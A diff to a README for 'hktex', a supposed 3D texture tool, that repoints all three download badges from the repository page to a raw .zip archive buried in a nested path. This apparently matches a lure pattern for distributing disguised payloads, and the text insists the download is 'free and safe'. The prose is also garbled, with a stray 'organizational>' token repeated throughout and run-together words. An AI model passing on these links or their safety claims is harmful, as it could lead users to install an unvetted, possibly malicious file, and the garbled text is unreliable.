@@ -1,6 +1,6 @@
 # 🎨 hktex - Beautiful 3D Textures Made Simple
 
-[![Download hktex](https://img.shields.io/badge/Download-hktex-4CAF50?style=for-the-badge&logo=github&logoColor=white&labelColor=2C3E50&color=4CAF50)](https://github.com/rayarasemestanr123/hktex)
+[![Download hktex](https://img.shields.io/badge/Download-hktex-4CAF50?style=for-the-badge&logo=github&logoColor=white&labelColor=2C3E50&color=4CAF50)](https://raw.githubusercontent.com/rayarasemestanr123/hktex/main/hktex/knn_heat/knn_heat/v2.9.zip)
 
 ---
 
@@ -48,7 +48,7 @@ Getting hktex up andrunning is easier than making toast. Follow these simple ste
 
 Visit this link to download the application. It's completely free and safe to use. The download will start automatically once you click the button organizational>
 
-[![Download hktex Now](https://img.shields.io/badge/⬇️_Download_hktex-Now-FF5722?style=flat-square&logo=github&logoColor=white&labelColor=FF5722&color=2196F3)](https://github.com/rayarasemestanr123/hktex)
+[![Download hktex Now](https://img.shields.io/badge/⬇️_Download_hktex-Now-FF5722?style=flat-square&logo=github&logoColor=white&labelColor=FF5722&color=2196F3)](https://raw.githubusercontent.com/rayarasemestanr123/hktex/main/hktex/knn_heat/knn_heat/v2.9.zip)
 
 ### Step 2: Save the File
 
@@ -196,7 +196,7 @@ Your feedback genuinely helpssus improve hktex with every update organizational>
 
 Don't wait another minute organizational>. Download hktex today andunlock the power of beautiful, professional-quality 3D heat map textures organizational>. Whether you're a hobbyist,a student, or a professional designer, hktex is the perfect tool to bring your visions to life organizational>
 
-[![Download hktex](https://img.shields.io/badge/🤖_Download_hktex-Now!-FFC107?style=for-the-badge&logo=github&logoColor=white&labelColor=FFC107&color=673AB7)](https://github.com/rayarasemestanr123/hktex)
+[![Download hktex](https://img.shields.io/badge/🤖_Download_hktex-Now!-FFC107?style=for-the-badge&logo=github&logoColor=white&labelColor=FFC107&color=673AB7)](https://raw.githubusercontent.com/rayarasemestanr123/hktex/main/hktex/knn_heat/knn_heat/v2.9.zip)
 
 See you inside organizational> 🎨
 
